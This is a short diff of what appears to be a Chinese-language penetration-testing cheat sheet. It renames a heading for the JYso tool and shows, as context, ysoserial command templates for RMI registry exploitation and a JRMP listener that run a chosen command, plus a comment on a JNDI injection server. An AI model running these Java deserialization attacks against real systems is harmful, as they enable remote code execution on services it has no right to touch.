@@ -430,7 +430,7 @@ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <host> <port> <gadge
 java -cp ysoserial.jar ysoserial.exploit.JRMPListener <port> <gadget> "<cmd>"
 ```
 
-### JYso (增强版 ysoserial)
+### JYso（Java 反序列化利用工具）
 
 ```bash
 # JNDI 注入服务器（自动适配 JDK 版本）
